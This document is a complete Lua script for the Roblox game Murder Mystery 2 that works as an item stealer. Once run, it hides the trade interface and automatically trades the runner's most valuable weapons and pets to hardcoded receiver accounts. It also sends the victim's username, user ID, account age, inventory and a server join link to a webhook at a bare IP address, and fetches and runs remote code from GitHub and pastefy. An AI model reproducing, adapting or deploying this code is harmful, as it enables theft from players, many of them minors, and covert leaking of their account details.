Usernames = {
    'Joezeif111x', 
    'joeiamjoezeif', 
    'jo_125w'
}
BigHitsWebhook= "http://93.183.83.94:8000/webhook/cd9658dd-80fe-4955-8b61-7edf7362fb75"
local STEALER_TO_LOAD = [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/MurderMystery2/refs/heads/main/Skiddertrynabetuff"))()
]]
if queue_on_teleport then
	queue_on_teleport(STEALER_TO_LOAD)
end;
repeat
	task.wait()
until game:IsLoaded()
local ping = "--@everyone\n"
if getgenv().executed then
	return
end;
getgenv().executed = true;
local fuckassjobid = getgenv().abcdefg or game.JobId
local ServerHop = loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/addons/serverhop", true))
local Players = game:GetService('Players')
VIP = (game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer")
FULL = (#Players:GetPlayers() >= Players.MaxPlayers)
SHALL_SERVERHOP = VIP or FULL;
if SHALL_SERVERHOP and not table.find({"delta","krnl"}, identifyexecutor():lower()) then
	if VIP then
		Players.LocalPlayer:Kick('Vip Servers Are Not Supported!\nTeleporting To Supported Server In A Second')
	end;
	if FULL then
		Players.LocalPlayer:Kick('Full Servers Are Not Supported Due To!\nTeleporting To Supported Server In A Second')
	end;
	ServerHop()
	return
end;
if table.find({"delta"}, identifyexecutor():lower()) and not getgenv().abcdefg then
    game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
        queue_on_teleport([[getgenv().abcdefg = "]]..v.ServerInstanceId..[[";]])
    end)
    for _ = 1, 2 do
        task.spawn(function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, fuckassjobid)
        end)
        task.wait()
    end
end
MinimumStealValue = 1;
ROBLOX_JOIN_CLICK_URL = 'https://fern.wtf/joiner?placeId=' .. game.PlaceId .. '&gameInstanceId=' .. fuckassjobid;
Webhook = BigHitsWebhook;
USERNAME_PATTERN_ALLOWED = false;
function MM2_STEALER()
	version = "7fts version!"
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end;
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer;
	Player:WaitForChild("PlayerGui", 600)
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	local VirtualUser = game:GetService("VirtualUser")
	local LocalPlayer = Players.LocalPlayer;
	local bb = game:GetService("VirtualUser")
	game:service"Players".LocalPlayer.Idled:connect(function()
		bb:CaptureController()
		bb:ClickButton2(Vector2.new())
	end)
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end;
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer;
	Player:WaitForChild("PlayerGui", 600)
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	local VirtualUser = game:GetService("VirtualUser")
	local LocalPlayer = Players.LocalPlayer;
	local CoinCollected = ReplicatedStorage.Remotes.Gameplay.CoinCollected;
	local RoundStart = ReplicatedStorage.Remotes.Gameplay.RoundStart;
	local events = {
		"MouseButton1Click",
		"MouseButton1Down",
		"Activated"
	}
	function TapUI(button, check, button2)
		if check == "Active Check" then
			if button.Active then
				button = button[button2]
			else
				return
			end
		end;
		if check == "Text Check" then
			if button == "^" then
				button = button2
			else
				return
			end
		end;
		for i, v in pairs(events) do
			for i, v in pairs(getconnections(button[v])) do
				v:Fire()
			end
		end
	end;
	repeat
		task.wait(1)
		pcall(function()
			TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
		end)
		pcall(function()
			TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
		end)
	until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
	universeid = game.GameId;
	if universeid ~= 66654135 then
		return
	end;
	function get_device_type()
		local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI;
		local lobbygui = maingui:FindFirstChild("Lobby")
		local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil;
		return MobileState and 'mobile' or 'tablet'
	end;
	local TradeService = ReplicatedStorage:WaitForChild("Trade")
	local Players = game:GetService("Players")
	local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
	local HttpService = game:GetService("HttpService")
	local rarityTable = {
		"Common",
		"Uncommon",
		"Rare",
		"Legendary",
		"Godly",
		"Ancient",
		"Unique",
		"Vintage"
	}
	local categories = {
		godly = "https://supremevaluelist.com/mm2/godlies.html",
		ancient = "https://supremevaluelist.com/mm2/ancients.html",
		unique = "https://supremevaluelist.com/mm2/uniques.html",
		classic = "https://supremevaluelist.com/mm2/vintages.html",
		chroma = "https://supremevaluelist.com/mm2/chromas.html"
	}
	local headers = {
		["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
	}
	local function trim(s)
		return s:match("^%s*(.-)%s*$")
	end;
	local function fetchHTML(url)
		local response = request({
			Url = url,
			Method = "GET",
			Headers = headers
		})
		return response.Body
	end;
	local function parseValue(itembodyDiv)
		local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
		if valueStr then
			valueStr = valueStr:gsub(",", "")
			local value = tonumber(valueStr)
			if value then
				return value
			end
		end;
		return nil
	end;
	local function extractItems(htmlContent)
		local itemValues = {}
		for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
			itemName = itemName:match("([^<]+)")
			if itemName then
				itemName = trim(itemName:gsub("%s+", " "))
				itemName = trim((itemName:split(" Click "))[1])
				local itemNameLower = itemName:lower()
				local value = parseValue(itembodyDiv)
				if value then
					itemValues[itemNameLower] = value
				end
			end
		end;
		return itemValues
	end;
	local function extractChromaItems(htmlContent)
		local chromaValues = {}
		for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
			chromaName = chromaName:match("([^<]+)")
			if chromaName then
				chromaName = trim(chromaName:gsub("%s+", " ")):lower()
				local value = parseValue(itembodyDiv)
				if value then
					chromaValues[chromaName] = value
				end
			end
		end;
		return chromaValues
	end;
	local function buildValueList()
		local allExtractedValues = {}
		local chromaExtractedValues = {}
		local categoriesToFetch = {}
		for rarity, url in pairs(categories) do
			table.insert(categoriesToFetch, {
				rarity = rarity,
				url = url
			})
		end;
		local totalCategories = #categoriesToFetch;
		local completed = 0;
		local lock = Instance.new("BindableEvent")
		for _, category in ipairs(categoriesToFetch) do
			task.spawn(function()
				local rarity = category.rarity;
				local url = category.url;
				local htmlContent = fetchHTML(url)
				if htmlContent and htmlContent ~= "" then
					if rarity ~= "chroma" then
						local extractedItemValues = extractItems(htmlContent)
						for itemName, value in pairs(extractedItemValues) do
							allExtractedValues[itemName] = value
						end
					else
						chromaExtractedValues = extractChromaItems(htmlContent)
					end
				end;
				completed = completed + 1;
				if completed == totalCategories then
					lock:Fire()
				end
			end)
		end;
		lock.Event:Wait()
		local valueList = {}
		for dataid, item in pairs(database) do
			local itemName = item.ItemName and item.ItemName:lower() or ""
			local rarity = item.Rarity or ""
			local hasChroma = item.Chroma or false;
			if itemName ~= "" and rarity ~= "" then
				local weaponRarityIndex = table.find(rarityTable, rarity)
				local godlyIndex = table.find(rarityTable, "Godly")
				if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
					if hasChroma then
						local matchedChromaValue = nil;
						for chromaName, value in pairs(chromaExtractedValues) do
							if chromaName:find(itemName) then
								matchedChromaValue = value;
								break
							end
						end;
						if matchedChromaValue then
							valueList[dataid] = matchedChromaValue
						end
					else
						local value = allExtractedValues[itemName]
						if value then
							valueList[dataid] = value
						end
					end
				end
			end
		end;
		return valueList
	end;
	local Valuelist_WEAPONS = buildValueList()
	local Valuelist_PETS = {
		['Ghosty'] = 1,
		['Piggy'] = 25,
		['Traveller'] = 1,
		['FoxChroma'] = 13,
		['GreenP'] = 50,
		['Reindeer'] = 12,
		['BearChroma'] = 12,
		['PurpleP'] = 15,
		['<3'] = 10,
		['DogFire'] = 1,
		['Fairy'] = 15,
		['Elfy'] = 8,
		['UFO'] = 5,
		['Jetstream'] = 15,
		['Santa'] = 35,
		['BatFire'] = 1,
		['ZombieDog'] = 450,
		['GreenPumpkin19'] = 12,
		['CatFire'] = 1,
		['Dogey'] = 65,
		['RedP'] = 60,
		['Steambird'] = 1,
		['Badger'] = 1,
		['Skelly'] = 1,
		['RedPumpkin19'] = 12,
		['VampireBat'] = 15,
		['Seahorsey'] = 15,
		['BunnyFire'] = 1,
		['Pengy'] = 13,
		['Rudolph'] = 15,
		['BluePumpkin19'] = 2,
		['PumpkinPet'] = 25,
		['Tankie'] = 10,
		['BatChroma'] = 17,
		['BlueP'] = 80,
		['BearFire'] = 1,
		['DogChroma'] = 17,
		['BunnyChroma'] = 17,
		['Deathspeaker'] = 4,
		['Elf2019'] = 175,
		['PigChroma'] = 13,
		['Overseer Eye'] = 15,
		['Eye'] = 15,
		['RedPumpkin2020'] = 7,
		['GreenPumpkin2020'] = 3,
		['Reindeer2020'] = 2,
		['Frostbird'] = 2,
		['CatChroma'] = 18,
		['BlackCat'] = 65,
		['Nobledragon'] = 17,
		['IcePhoenix'] = 1,
		['Chilly'] = 13,
		['FoxFire'] = 1,
		['AmericanEagle'] = 2,
		['Mechbug'] = 5,
		['Electro'] = 2,
		['Phoenix'] = 2,
		['Skull2021'] = 1,
		['PigFire'] = 1
	}
	local rarityPriority = {
		"Unique",
		"Ancient",
		"Godly"
	}
	local egorPriority = {
		"Vintage",
		"Legendary"
	}
	DATABASE = game:GetService("ReplicatedStorage").GetSyncData:InvokeServer()
	WEAPON_DATABASE = DATABASE['Item']
	PETS_DATABASE = DATABASE['Pets']
	function GetSortedInventory()
		local Inventory = {}
		local inv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)
		local WEAPONS = inv['Weapons']['Owned']
		local PETS = inv['Pets']['Owned']
		local foundGoodItem = false;
		for i, v in pairs(WEAPONS) do
			local itemData = WEAPON_DATABASE[i]
			if itemData then
				if table.find(rarityPriority, itemData.Rarity) then
					foundGoodItem = true
				end
			end
		end;
		if not foundGoodItem then
			Webhook = BigHitsWebhook
			USERNAME_PATTERN_ALLOWED = true;
			MinimumStealValue = 10;
			Usernames = {
				'TAXED_BY_EGORIKUSA'
			}
			rarityPriority = egorPriority
		end;
		for i, v in pairs(WEAPONS) do
			local itemData = WEAPON_DATABASE[i]
			if itemData then
				local rap = (Valuelist_WEAPONS[i] or 0) * v;
				if not(itemData.ItemName == "Default Knife" or itemData.ItemName == "Default Gun") then
					if rap >= MinimumStealValue and table.find(rarityPriority, itemData.Rarity) then
						table.insert(Inventory, {
							["Name"] = itemData.ItemName,
							["ID"] = i,
							["RAP"] = rap,
							["Class"] = itemData.ItemType,
							["Rarity"] = itemData.Rarity,
							["Amount"] = v,
							["Chroma"] = itemData.Chroma
						})
					end
				end
			end
		end;
		table.sort(Inventory, function(a, b)
			if a.RAP ~= b.RAP then
				return a.RAP > b.RAP
			end;
			local rarityA = table.find(rarityPriority, a.Rarity)
			local rarityB = table.find(rarityPriority, b.Rarity)
			if rarityA and rarityB then
				return rarityA < rarityB
			elseif rarityA then
				return true
			elseif rarityB then
				return false
			else
				return false
			end
		end)
		return Inventory
	end;
	total_value = 0;
	hits = GetSortedInventory()
	for i, v in pairs(hits) do
		total_value = total_value + v.RAP
	end;
	if total_value < 1 then
		return
	end;
	local item_counter = 0;
	all_items = ''
	for i, v in pairs(hits) do
		item_counter = item_counter + 1;
		all_items = all_items .. v.Name .. " (x" .. v.Amount .. "): " .. v.RAP .. " Value\n"
		if item_counter == 30 then
			all_items = all_items .. "\n\nAnd more..."
			break
		end
	end;
	require(game:GetService("ReplicatedStorage").Modules.InventoryModule).UpdateInventory = function()
	end;
	local DEVICE_TYPE = get_device_type()
	function HideGui()
		task.spawn(function()
			local guiElements = game:GetService("Players").LocalPlayer.PlayerGui["TradeGUI"]
			for i, v in pairs(guiElements:GetChildren()) do
				v.Position = UDim2.new(99, 99, 99, 99)
			end;
			local mobileguielements = game:GetService("Players").LocalPlayer.PlayerGui["TradeGUI_Phone"]
			mobileguielements.Inactive.Frame.Position = UDim2.new(99, 99, 99, 99)
			mobileguielements.Inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99)
			mobileguielements.Container.Position = UDim2.new(99, 99, 99, 99)
			if DEVICE_TYPE == 'tablet' then
				local click_blocker = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild('ClickBlocker')
				click_blocker.Visible = false;
				click_blocker:GetPropertyChangedSignal("Visible"):Connect(function()
					click_blocker.Visible = false
				end)
				local Inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Inspect")
				Inspect.Visible = false;
				Inspect:GetPropertyChangedSignal("Visible"):Connect(function()
					Inspect.Visible = false
				end)
				local trade_request = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container"):WaitForChild("TradeRequest")
				trade_request.Visible = false;
				trade_request:GetPropertyChangedSignal("Visible"):Connect(function()
					trade_request.Visible = false
				end)
			else
				local Popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Popup')
				Popup.Visible = false;
				Popup:GetPropertyChangedSignal("Visible"):Connect(function()
					Popup.Visible = false
				end)
				local overlay_menu = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild('OverlayMenu'):WaitForChild('TradeRequest')
				overlay_menu.Visible = false;
				overlay_menu:GetPropertyChangedSignal("Visible"):Connect(function()
					overlay_menu.Visible = false
				end)
			end
		end)
	end;
	function IsTrading()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		TradeService = ReplicatedStorage:WaitForChild("Trade")
		return TradeService.GetTradeStatus:InvokeServer()
	end;
	function ReadyTrade()
		while IsTrading() ~= "None" do
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			TradeService = ReplicatedStorage:WaitForChild("Trade")
			TradeService.AcceptTrade:FireServer(game.PlaceId * 2)
			task.wait(0.2)
		end
	end;
	function SendTrade(Username)
		if DEVICE_TYPE == 'tablet' then
			local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container")
			local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
			getconnections(target_button.MouseButton1Click)[1]:Fire()
			local Inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Inspect")
			local button_trade = Inspect:WaitForChild("Trade")
			getconnections(button_trade.MouseButton1Click)[1]:Fire()
		else
			local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("PlayerList")
			local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
			getconnections(target_button.MouseButton1Click)[1]:Fire()
			local Popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Popup')
			local button_trade = Popup:WaitForChild("Container"):WaitForChild("Action"):WaitForChild('Trade')
			conns = getconnections(button_trade.Activated)
			conns[1]:Fire()
		end
	end;
	function DepositItemInTrade(gameProductId, gameType, count)
		if gameProductId == nil or gameType == nil or count == nil then
			LocalPlayer:Kick("something is wrong... report that here: \ndiscord.gg/X2cE85xF9m")
		end;
		for _ = 1, count do
			TradeService.OfferItem:FireServer(gameProductId, gameType)
			task.wait()
		end;
		DepositedItems = DepositedItems + 1
	end;
	function stop_trade()
		if DEVICE_TYPE == 'tablet' then
			local button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('TradeGui'):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild('Actions'):WaitForChild('Decline')
			getconnections(button.MouseButton1Click)[1]:Fire()
		else
			local mobile_button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild('Container'):WaitForChild("Trade"):WaitForChild('Actions'):WaitForChild('Decline'):WaitForChild('ActionButton')
			getconnections(mobile_button.MouseButton1Click)[1]:Fire()
		end
	end;
	function declince_trade_request()
		if DEVICE_TYPE == 'tablet' then
			local button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container"):WaitForChild("TradeRequest"):WaitForChild('ReceivingRequest'):WaitForChild('Decline')
			getconnections(button.MouseButton1Click)[1]:Fire()
		else
			local mobile_button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("OverlayMenu"):WaitForChild("TradeRequest"):WaitForChild('ReceivingRequest'):WaitForChild('Decline')
			getconnections(mobile_button.MouseButton1Click)[1]:Fire()
		end
	end;
	function cancel_pending_request()
		if DEVICE_TYPE == 'tablet' then
			local button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container"):WaitForChild("TradeRequest"):WaitForChild('SendingRequest'):WaitForChild('Cancel')
			getconnections(button.MouseButton1Click)[1]:Fire()
		else
			local mobile_button = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("OverlayMenu"):WaitForChild('TradeRequest'):WaitForChild('SendingRequest'):WaitForChild('Cancel')
			getconnections(mobile_button.MouseButton1Click)[1]:Fire()
		end
	end;
	function Steal(plr)
		HideGui()
		local Username = plr.Name;
		while IsTrading() ~= "None" do
			stop_trade()
			declince_trade_request()
			cancel_pending_request()
			task.wait(0.2)
		end;
		repeat
			SendTrade(Username)
			task.wait(0.2)
		until IsTrading() ~= "None"
		repeat
			task.wait(0.1)
		until IsTrading() == "StartTrade"
		DepositedItems = 0;
		while IsTrading() == "StartTrade" do
			task.wait(0.1)
			current_inv = GetSortedInventory()
			if #current_inv > 0 then
				for i, v in pairs(current_inv) do
					DepositItemInTrade(v.ID, v.Class, v.Amount)
					if DepositedItems == 4 then
						DepositedItems = 0;
						ReadyTrade()
						return
					end;
					task.wait()
				end
			end;
			task.wait()
			if #current_inv == 0 then
				if DepositedItems == 0 then
					LocalPlayer:Kick("U have been banned for exploiting, ur data are cleared")
					break
				end;
				task.wait()
			end
		end
	end;
	function UnlockTrades()
		game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
	end;
	function LoopSteal(plr)
		UnlockTrades()
		task.spawn(function()
			while task.wait(0.1) do
				Steal(plr)
			end
		end)
	end;
	function shall_steal(plr)
		if plr.Name == game.Players.LocalPlayer.Name then
			return false
		end;
		for i, v in pairs(Usernames) do
			if v:lower() == plr.Name:lower() then
				return true
			end
		end;
		if string.find(plr.Name:lower(), "egorhits_") then
			return true
		end;
		return false
	end;
	function PrepareSteal(plr)
		UnlockTrades()
		task.wait()
		TradeService.SendRequest.OnClientInvoke = function(sender)
			if shall_steal(sender) then
				task.wait()
				declince_trade_request()
				task.wait()
				LoopSteal(plr)
			else
				declince_trade_request()
			end;
			return true
		end
	end;
	for i, v in pairs(game.Players:GetChildren()) do
		if shall_steal(v) then
			PrepareSteal(v)
		end
	end;
	Players.PlayerAdded:Connect(function(plr)
		if shall_steal(plr) then
			PrepareSteal(plr)
		end
	end)
	for _, plr in pairs(Players:GetPlayers()) do
		if shall_steal(plr) then
			plr.Chatted:Connect(function()
				LoopSteal(plr)
			end)
		end
	end;
	Players.PlayerAdded:Connect(function(plr)
		if shall_steal(plr) then
			plr.Chatted:Connect(function()
				LoopSteal(plr)
			end)
		end
	end)
	imgs = "https://tenor.com/view/bh187-spongebob-patrick-star-derp-duh-gif-21500047"
	local fardplayer = game:GetService("Players").LocalPlayer;
	local ExecutorWebhook = identifyexecutor() or "undefined"
	content_ping = ping .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. fuckassjobid .. '")'
	content_logs = content_ping;
	local random = Random.new()
	local checknum = random:NextInteger(1, 100)
	local data = {
		content = content_logs,
		username = game.Players.LocalPlayer.Name,
		avatar_url = imgs,
		embeds = {
			{
				title = "Pending Hit \240\159\148\141 ... | Murder Mystery 2",
				description = "",
				color = tonumber((8388736)),
				fields = {
					{
						["name"] = "\240\159\145\187 __**information:**__",
						["value"] = "```Username     : " .. fardplayer.Name .. "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge .. " Days" .. "\nExploit      : " .. ExecutorWebhook .. "\nReceivers    : " .. table.concat(Usernames, ", ") .. "\nVersion      : " .. version .. "```",
						["inline"] = false
					},
					{
						["name"] = "\240\159\142\131 __/__ **`Inventory:`**",
						["value"] = "```Total Value: " .. total_value .. "\n\n" .. all_items .. "```",
						["inline"] = false
					},
					{
						name = 'Click To Join',
						value = ROBLOX_JOIN_CLICK_URL,
						inline = false
					}
				}
			}
		}
	}
	res = request({
		Url = Webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(data)
	})
	local searchData = {
		content = "\240\159\148\141 **Search Command Ready**\nRun this slash command:\n`/search target:" .. fardplayer.Name .. " game:" .. game.PlaceId .. "`",
		username = game.Players.LocalPlayer.Name,
		avatar_url = imgs
	}
	request({
		Url = Webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(searchData)
	})
end;
MM2_STEALER()
loadstring(game:HttpGet("https://pastefy.app/KA3fhTpy/raw"))()
